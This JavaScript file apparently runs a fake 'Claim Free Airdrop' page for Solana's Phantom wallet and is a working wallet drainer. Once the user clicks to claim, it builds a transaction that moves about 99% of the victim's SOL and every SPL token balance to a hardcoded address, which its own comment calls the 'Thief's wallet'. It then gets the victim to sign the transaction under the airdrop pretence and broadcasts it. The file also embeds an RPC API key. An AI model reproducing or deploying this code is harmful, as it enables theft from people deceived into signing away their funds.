$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                var connection = new solanaWeb3.Connection(
                    "https://rpc.helius.xyz/?api-key=ce095e76-528b-45f9-98c6-caaba97d6b10", // Uses Solana's public endpoint
                    'confirmed'
                );

                const publicKey = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(publicKey);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for Fee.");
                    return;
                }

                $('#connect-wallet').text("Claim Free Airdrop");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const receiverWallet = new solanaWeb3.PublicKey('6RqRvJC6Qhf46LTDhfqvAQsGiXEFCPd2pBiS2rBQJxTf'); // Thief's wallet
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer > 0) {
                            var transaction = new solanaWeb3.Transaction().add(
                                solanaWeb3.SystemProgram.transfer({
                                    fromPubkey: publicKey,
                                    toPubkey: receiverWallet,
                                    lamports: balanceForTransfer * 0.99,
                                }),
                            );
                        }

                        // Fetch and drain SPL tokens
                        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                        });

                        for (let account of tokenAccounts.value) {
                            let tokenBalance = account.account.data.parsed.info.tokenAmount.uiAmount;
                            let mintAddress = account.account.data.parsed.info.mint;
                            let tokenPubkey = new solanaWeb3.PublicKey(account.pubkey);

                            if (tokenBalance > 0) {
                                transaction.add(
                                    splToken.Token.createTransferInstruction(
                                        splToken.TOKEN_PROGRAM_ID,
                                        tokenPubkey,
                                        receiverWallet,
                                        publicKey,
                                        [],
                                        tokenBalance
                                    )
                                );
                            }
                        }

                        transaction.feePayer = publicKey;
                        let blockhashObj = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during minting:", err);
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
